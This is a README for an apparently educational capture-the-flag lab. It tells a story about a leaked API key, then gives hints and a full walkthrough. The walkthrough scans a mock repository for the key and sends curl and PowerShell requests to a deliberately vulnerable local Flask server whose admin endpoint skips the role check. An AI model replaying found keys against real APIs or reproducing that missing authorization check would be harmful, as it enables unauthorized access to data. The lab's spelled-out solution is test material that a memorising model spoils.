[← Previous Day](../day08/README.md) | [Main README](../README.md) | **Day 9** | [Next Day →](../day10/README.md)

---

![Day 9](../Images/Day09.png)

# 🎄 Day 9 (December 20) - The GitHub Secret Leak

## 🎅 The Story

**December 20, 2024 - 07:30 AM (North Pole Time)**

Tom Icicle arrives at the SOC to find Dekker Frostbeard staring intently at his monitor, his Santa hat sitting askew after what was clearly a sleepless night.

"Tom, we have a major problem," Dekker says without looking up. "Remember the Gift Tracking API we deployed three weeks ago?"

Tom sets down his coffee, sensing where this is going. "The internal service that tracks production status for all 2.7 million gifts? What about it?"

Dekker spins his monitor around, showing a GitHub security alert. **"GitHub Secret Scanning found an API key in our repository. Committed December 12th. That's eight days ago, Tom. Eight days our production API key has been sitting in public git history."**

Tom's face goes pale as he reads the alert:

```
⚠️ SECRET SCANNING ALERT
Repository: northpole-internal/gift-tracking-service
Secret Type: API Key
Pattern: NPGIFT-[a-zA-Z0-9]+
File: config.py
Commit: e7f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6
Date: December 12, 2024
Status: EXPOSED
```

"Please tell me that repository is private," Tom says, knowing the answer.

Dekker closes his eyes. "It *was* private. But remember when we did the big infrastructure migration on December 15th? Someone accidentally changed the repository visibility to public for 'temporary testing.' It was public for six hours before we caught it."

"Six hours," Tom repeats slowly. "That's more than enough time for Jack Frost to clone the entire repository, including all the git history with that API key."

Merry Tinselcode wheels over, pulling up the repository on her screen. "I'm looking at the commit history. Tom committed the initial version of `config.py` on December 12th with the API key hardcoded. We fixed it on December 19th—yesterday—by moving secrets to environment variables, but..." She trails off, scrolling through the commits.

"But git never forgets," Tom finishes grimly. "The old commit with the hardcoded key is still in the repository history. Anyone who cloned the repo has it."

Aisha Frostwhisper joins the huddle, tablet in hand. "How bad is this? What can someone do with that API key?"

Tom pulls up the API documentation. "The leaked key is for our `gift_tracker_service` account. It's supposed to have limited permissions—just reading gift production status and updating delivery statuses. But let me check what endpoints are actually exposed..."

He navigates to the API gateway configuration and his expression darkens. "There's an admin endpoint. `/api/v2/admin/secrets`. It shouldn't be accessible to service accounts, but..."

Merry types rapidly, testing the configuration. "Tom, I don't think the authorization checks on that endpoint are implemented correctly. Look at this code—it's checking if the user is *authenticated* but not if they're actually an *admin*."

Dekker leans forward. "You're telling me there's an authorization bypass vulnerability? Anyone with a valid API key—even a low-privilege one—can access admin endpoints?"

"That's exactly what I'm saying," Merry confirms. "This is Authorization 101. Authentication proves *who you are*. Authorization proves *what you're allowed to do*. This API checks authentication but completely fails at authorization."

Tom grabs his laptop. "We need to validate this immediately. We need to:

1. **Scan our repository** to confirm what secrets were leaked and when
2. **Test the leaked API key** to see if it still works (we should have rotated it but let's verify)
3. **Test the admin endpoint** with the service account key to confirm the authorization bypass
4. **Find out what's in that admin endpoint** and assess the damage if Jack Frost already exploited it"

Sarah Hollycode appears with her security laptop. "I've got our secret scanning tool ready. It'll search the repository for any API keys, passwords, or tokens that shouldn't be there. And I can spin up a local test instance of the API server so we can test the vulnerability safely without touching production."

"Do it," Dekker orders. "Tom, you run the repository scan. Sarah, start the test API server. Merry, monitor production logs for any suspicious API calls to that admin endpoint. If Jack Frost already has that key, he might already be using it."

Tom opens the terminal and navigates to a local clone of the gift-tracking-service repository. "Running secret scanner now..."

Aisha looks worried. "What kind of data is in the admin endpoint? What could Jack Frost access if he exploits this?"

Sarah pulls up the API server code. "According to the source code... classified security intel, incident reports, and..." She stops, her face falling. "And there's a flag in there. A flag that shouldn't exist. Someone left debugging data in a production endpoint."

"A flag?" Dekker asks sharply.

"Look at this," Sarah shows them the code. "The admin endpoint returns a JSON object with 'classified_intel', 'security_notes', and... a 'flag' field containing a debug value. It looks like someone was testing and left that in the code."

Tom stops typing. "You're telling me Jack Frost could have our entire security investigation findings *and* there's a flag literally telling him he successfully exploited a leaked GitHub credential?"

"That's exactly what I'm saying," Sarah confirms. "And if he's been reading our security notes, he knows everything we know about his attack patterns."

Merry brings up the production logs. "Tom, I'm seeing API requests from 203.0.113.99—Jack's C2 server—hitting our API gateway. Timestamps from December 18th through today. He's been actively using our API."

Dekker slams his hand on the desk. "He's had access to our Gift Tracking API for two days and we didn't know. Tom, I need you to run that repository scan, find that leaked key, test it against the API server, and confirm the authorization bypass. We need to know exactly what Jack Frost knows."

Tom cracks his knuckles and opens the challenge directory. "On it. Let's see what we've leaked and how bad this really is."

Outside, the morning sun glints off fresh snow. But inside the North Pole SOC, the elves are racing to understand the full scope of their exposed secrets—before Jack Frost can use them to ruin Christmas.

---

## 🎯 **YOUR MISSION: Exploit the Leaked API Key!**

**This is NOT a passive log analysis challenge!**

You will:
✅ Run a secret scanner to find leaked API keys in git history
✅ Start a real Flask API server on your computer
✅ Make actual API calls with curl or PowerShell
✅ Exploit an authorization bypass vulnerability to access admin endpoints
✅ Extract the flag from the API response yourself

**This is hands-on API hacking!** 🎉

---

## 🛠️ Prerequisites & Setup

**You'll need:**
- Python 3.7 or higher
- Flask (Python web framework)
- curl (built into Windows 10/11) OR PowerShell
- **Two terminal windows** (one for server, one for requests)
- 20-30 minutes for setup and exploitation

**Don't worry if you've never used Flask or APIs!** We provide complete setup instructions.

### 📋 Setup Steps:

1. **Install Python** (if not already installed)
2. **Install Flask** (`pip install flask`)
3. **Run secret scanner** (`python secret_scanner.py mock_git_repo`)
4. **Start API server** (`python gift_api_server.py`) ← **Keep this running!**
5. **Open NEW terminal** for making API calls
6. **Start exploiting!**

📖 **Detailed setup guide:** See `artifacts/SETUP_GUIDE.txt`

**Estimated setup time:** 5-10 minutes

---

## 📚 Lesson: Learn the Technique

**Before starting this challenge, read the lesson:**
📖 [API Security, Authorization, and Secret Management](./lesson_api_security.md)

This comprehensive lesson covers:
- What APIs are and why they're critical targets
- Authentication vs. Authorization (and why both matter!)
- Common API vulnerabilities (OWASP API Security Top 10)
- What secrets are and why they shouldn't be in git
- How secrets leak (hardcoded credentials, git history, environment variables)
- GitHub Secret Scanning and similar tools
- Authorization bypass attacks and privilege escalation
- Testing APIs safely and ethically
- Real-world API security incidents

**New to API security?** Start with the lesson - it assumes zero prior knowledge and teaches you everything from scratch!

**Already comfortable with APIs?** Jump straight to the challenge! 🚀

---

## 🎯 The Challenge

You are **Tom Icicle**, Incident Response Lead. Your mission:

**Assess the impact of the leaked API key by exploiting it yourself!**

**Quick Reference - Steps to Complete:**

1. Extract artifacts with Day 8's flag as password
2. Scan for leaked secrets: `python secret_scanner.py mock_git_repo`
3. Find the API key in the output (starts with `NPGIFT-`)
4. Install Flask: `pip install flask`
5. Start API server: `python gift_api_server.py` (keep running!)
6. Open new terminal for testing
7. Test authentication: `curl -H "X-API-Key: NPGIFT-..." http://localhost:5001/api/v2/auth/verify`
8. Exploit authorization bypass: Access `/api/v2/admin/secrets` with the leaked key
9. Extract flag from JSON response!

---

## 🔍 Artifacts

**Password required:** Use Day 8's flag to extract `artifacts.7z`

In the `artifacts/` folder you'll find:

- **`gift_api_server.py`** - Vulnerable Flask API server (run this locally!)
  - Contains authentication logic (validates API keys)
  - Contains BROKEN authorization logic (doesn't check admin role!)
  - Admin endpoint `/api/v2/admin/secrets` returns the flag
  - Detailed code comments explaining the vulnerability
  - Windows compatible (requires Python + Flask)

- **`secret_scanner.py`** - Repository secret scanning tool
  - Scans directories for leaked credentials
  - Detects API keys, passwords, tokens
  - Works like TruffleHog, GitLeaks, GitHub Secret Scanning
  - Windows compatible (pure Python)

- **`mock_git_repo/`** - Simulated git repository with leaked secrets
  - `config.py.old` - OLD configuration with hardcoded API key ← **Leaked secret here!**
  - `config.py` - NEW configuration (fixed, uses environment variables)
  - `README.md` - Repository documentation (mentions the security fix)
  - `.git_history.txt` - Simulated git commit history showing when key was added/removed
  - `requirements.txt` - Python dependencies

- **`SETUP_GUIDE.txt`** - Complete Windows setup instructions
  - Python installation verification
  - Flask installation
  - Running the API server
  - Making API requests with curl and PowerShell
  - Troubleshooting guide

### 🚀 Quick Start:

```bash
# 1. Install Flask
pip install flask

# 2. Find the leaked API key
python secret_scanner.py mock_git_repo

# 3. Start the API server (keep this terminal running!)
python gift_api_server.py

# 4. In a NEW terminal, test authentication:
curl -H "X-API-Key: NPGIFT-4c7e8a9b2f1d6e3a" http://localhost:5001/api/v2/auth/verify

# 5. Exploit the authorization bypass to get the flag:
curl -H "X-API-Key: NPGIFT-4c7e8a9b2f1d6e3a" http://localhost:5001/api/v2/admin/secrets
```

**⚠️ Remember:** You need TWO terminal windows - one for the server (keep running), one for curl commands!

---

## 💡 Hints

<details>
<summary>Hint 1: Running the secret scanner</summary>

The secret scanner tool searches files for leaked credentials.

**Windows (PowerShell or Command Prompt):**
```powershell
cd artifacts
python secret_scanner.py mock_git_repo
```

**Look for output like:**
```
⚠️  FOUND 1 POTENTIAL SECRET(S)!

Finding #1:
  Type:     API Key (North Pole Gift)
  File:     mock_git_repo/config.py.old
  Line:     15
  Secret:   NPGIFT-4c7e8a9b2f1d6e3a
```

**The API key you find is what you'll use to test the API!**

</details>

<details>
<summary>Hint 2: Installing Flask and starting the API server</summary>

The API server runs with Flask, which you need to install first.

**Install Flask (Windows PowerShell or Command Prompt):**
```powershell
pip install flask
```

**Start the API server:**
```powershell
cd artifacts
python gift_api_server.py
```

**You should see:**
```
🎄 North Pole Gift Tracking API Server - Day 9
Starting Flask API server on http://localhost:5001
Press Ctrl+C to stop the server
```

**Leave this terminal window open!** The server needs to keep running while you test it.

**Open a NEW terminal window** to make API requests.

</details>

<details>
<summary>Hint 3: Testing the API with curl (Windows)</summary>

curl is built into Windows 10/11. Use it to make HTTP requests.

**Test if the server is running:**
```bash
curl http://localhost:5001
```

**Test authentication with your leaked API key:**
```bash
curl -H "X-API-Key: NPGIFT-4c7e8a9b2f1d6e3a" http://localhost:5001/api/v2/auth/verify
```

**Expected response:**
```json
{
  "authenticated": true,
  "user": "gift_tracker_service",
  "role": "service_account",
  "permissions": ["read_gifts", "update_status"]
}
```

**Notice:** Role is "service_account", NOT "administrator"!

**Try accessing gifts:**
```bash
curl -H "X-API-Key: NPGIFT-4c7e8a9b2f1d6e3a" http://localhost:5001/api/v2/gifts/list
```

</details>

<details>
<summary>Hint 4: Alternative - Using PowerShell instead of curl</summary>

If curl isn't working, use PowerShell's `Invoke-WebRequest`:

**Test authentication:**
```powershell
$headers = @{"X-API-Key" = "NPGIFT-4c7e8a9b2f1d6e3a"}
Invoke-WebRequest -Uri "http://localhost:5001/api/v2/auth/verify" -Headers $headers | Select-Object -ExpandProperty Content
```

**Access admin endpoint:**
```powershell
$headers = @{"X-API-Key" = "NPGIFT-4c7e8a9b2f1d6e3a"}
Invoke-WebRequest -Uri "http://localhost:5001/api/v2/admin/secrets" -Headers $headers | Select-Object -ExpandProperty Content
```

</details>

<details>
<summary>Hint 5: Understanding the authorization bypass</summary>

**Authentication vs. Authorization - what's the difference?**

- **Authentication:** Proves WHO you are (valid username/password, API key, etc.)
- **Authorization:** Proves WHAT you're allowed to do (admin privileges, permissions)

**The vulnerability in this API:**

The `/api/v2/admin/secrets` endpoint checks if you're authenticated (have a valid API key) but **forgets to check if you're an admin!**

**Broken code (simplified):**
```python
if user_info.get("active"):  # Only checks if account is active!
    return admin_secrets     # Should check: user_info["role"] == "administrator"
```

**Result:** ANY valid API key can access admin endpoints, even non-admin keys!

**This is called an Authorization Bypass or Broken Access Control (OWASP API #1)**

</details>

<details>
<summary>Hint 6: Accessing the admin endpoint</summary>

Now that you understand the vulnerability, exploit it!

**Try accessing the admin endpoint with your service account key:**

**Using curl:**
```bash
curl -H "X-API-Key: NPGIFT-4c7e8a9b2f1d6e3a" http://localhost:5001/api/v2/admin/secrets
```

**Using PowerShell:**
```powershell
$headers = @{"X-API-Key" = "NPGIFT-4c7e8a9b2f1d6e3a"}
Invoke-WebRequest -Uri "http://localhost:5001/api/v2/admin/secrets" -Headers $headers | Select-Object -ExpandProperty Content
```

**Expected response (formatted):**
```json
{
  "access_level": "ADMIN",
  "message": "Access granted to classified information",
  "data": {
    "classified_intel": [...],
    "flag": "FROST{...}",
    "security_notes": "..."
  },
  "vulnerability": "Authorization bypass - any valid API key can access this!",
  "lesson": "Always check BOTH authentication AND authorization!"
}
```

**The flag is in the "flag" field!** Run the API server and make the request to see it! 🎄

</details>

<details>
<summary>Hint 7: Complete solution walkthrough</summary>

**Step-by-step solution:**

**1. Extract artifacts:**
```bash
# Use Day 8's flag as password (the flag you found from SQL injection)
```

**2. Scan for leaked secrets:**
```bash
cd artifacts
python secret_scanner.py mock_git_repo
```

**Output shows:**
```
Finding #1:
  Type:     API Key (North Pole Gift)
  File:     mock_git_repo/config.py.old
  Secret:   NPGIFT-4c7e8a9b2f1d6e3a
```

**3. Install Flask and start API server:**
```bash
pip install flask
python gift_api_server.py
```

**4. Test authentication (new terminal):**
```bash
curl -H "X-API-Key: NPGIFT-4c7e8a9b2f1d6e3a" http://localhost:5001/api/v2/auth/verify
```

**Response confirms:** user is "service_account", not admin

**5. Exploit authorization bypass:**
```bash
curl -H "X-API-Key: NPGIFT-4c7e8a9b2f1d6e3a" http://localhost:5001/api/v2/admin/secrets
```

**6. Extract flag from JSON response:**
```
"flag": "FROST{...}"  # The actual Day 9 flag
```

**That's your flag!** ✅

**Bonus: Read the source code** in `gift_api_server.py` to see exactly where the authorization check is broken. The comments explain the vulnerability in detail!

</details>

---

## ❓ Troubleshooting

**Problem:** Can't install Flask
**Solution:** Run `pip install flask` or `pip3 install flask`. If pip isn't found, reinstall Python with "Add to PATH" checked

**Problem:** `python: command not found`
**Solution:** Try `python3` instead of `python`. Or ensure Python is installed and in your PATH

**Problem:** Port 5001 already in use
**Solution:** Another app is using that port. Edit `gift_api_server.py` line 158 and change `port=5001` to `port=5002`

**Problem:** curl command not found (Windows)
**Solution:** Use PowerShell's `Invoke-WebRequest` instead (see Hint 4), or install curl from https://curl.se/windows/

**Problem:** Server stops when I run curl
**Solution:** You need TWO terminal windows - one for the server (keep it running!), one for curl commands

**Problem:** API returns 401 Unauthorized
**Solution:** Check that you're using the exact API key from the secret scanner output: `NPGIFT-4c7e8a9b2f1d6e3a`

**Problem:** Want more details
**Solution:** Read `SETUP_GUIDE.txt` for complete Windows setup instructions with PowerShell examples

---

## 🤔 Questions to Consider

As you solve this challenge, think about:

1. **Why is hardcoding secrets in source code dangerous?** What happens when code is committed to git?
2. **How does git history preserve secrets** even after they're removed from current files?
3. **What's the difference between authentication and authorization?** Why do you need both?
4. **Why is "any authenticated user = admin" a critical vulnerability?**
5. **How could the API developers have prevented the authorization bypass?**
6. **What tools can automatically detect secrets in repositories?** (GitHub Secret Scanning, TruffleHog, GitLeaks)
7. **How should secrets be managed properly?** (Environment variables, secret vaults, key management systems)
8. **What's the impact of a leaked API key?** What can attackers do with it?
9. **How does this relate to real-world breaches?** (Uber 2022, Codecov 2021, etc.)

---

## 🛡️ Defensive Insights

**What You're Learning:**

This challenge teaches critical API security concepts that apply to real-world development:

**Secret Management Best Practices:**
- ❌ NEVER hardcode secrets in source code
- ❌ NEVER commit secrets to git (even private repos!)
- ✅ Use environment variables for secrets
- ✅ Use secret management tools (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault)
- ✅ Enable GitHub Secret Scanning
- ✅ Use pre-commit hooks to prevent secret commits
- ✅ Rotate secrets immediately if leaked

**API Security Best Practices:**
- ✅ Always implement BOTH authentication AND authorization
- ✅ Check user roles/permissions before granting access
- ✅ Follow principle of least privilege (give minimum necessary permissions)
- ✅ Log all access to sensitive endpoints
- ✅ Use API gateways with proper access controls
- ✅ Test authorization logic thoroughly

**Authentication ≠ Authorization:**
- **Authentication:** "You are user123" (identity verification)
- **Authorization:** "User123 can read/write/admin" (permission verification)
- **Both are required!** This API only checked authentication!

---

## ➡️ Next Steps

Once you've exploited the authorization bypass and captured the flag, you've completed Day 9! 🎉

**What you've learned:**
- How secrets leak through git commit history
- Using secret scanning tools (like TruffleHog, GitLeaks, GitHub Secret Scanning)
- Making API requests with curl and PowerShell
- Testing API authentication
- Exploiting authorization bypass vulnerabilities
- Understanding broken access control (OWASP API #1)
- Differentiating authentication vs. authorization
- Reading and exploiting vulnerable source code
- Hands-on API security testing

**Use your Day 9 flag to unlock Day 10's artifacts:**
1. Navigate to `../day10/`
2. Find `day10_artifacts.zip`
3. Use your Day 9 flag (including `FROST{}`) as the password
4. Continue the investigation...

Jack Frost now has access to classified security intel from the admin endpoint. The elves need to stop him before Christmas Eve! 🎄

---

**Difficulty:** Medium-Hard
**Estimated Time:** 30-45 minutes
**Skills:** Secret scanning, API testing, authorization exploitation, command-line tools, vulnerability analysis
**Tools Needed:** Python, Flask, curl (or PowerShell), text editor
**Uses Previous Skills:**
- ✅ Command-line tools (Days 3, 6, 7)
- ✅ JSON parsing (Days 1, 6)
- ✅ Hands-on exploitation (Day 8 - SQL injection)
- ✅ Pattern recognition (Days 2, 4)

---

## 🎓 Real-World Context

API security and secret management are critical in modern software:

**Real-World Secret Leaks:**
- **Uber (2022):** Hardcoded credentials in source code led to massive breach
- **Codecov (2021):** Leaked credentials exposed 29,000 customers
- **Toyota (2022):** API keys exposed 296,000 customer records for 10 years
- **Dropbox (2022):** API key on GitHub compromised 130 customer repositories

**GitHub Secret Scanning:**
- GitHub automatically scans public repos for 200+ secret patterns
- Alerts repo owners when secrets are detected
- Partners with companies to automatically revoke exposed tokens
- Prevents secrets from being leaked in the first place

**Authorization Bypass Impact:**
- OWASP API Security Top 10 #1: Broken Object Level Authorization
- Allows low-privilege users to access admin/sensitive data
- Common in microservices and modern APIs
- Can lead to complete system compromise

**This challenge demonstrates real vulnerabilities that affect production systems every day!**

---

*"Authentication tells you who someone is. Authorization tells you what they can do. Confusing the two is like having perfect locks on your door but leaving the windows wide open."* - Tom Icicle, Incident Response Lead

**Flag Format:** `FROST{...}`
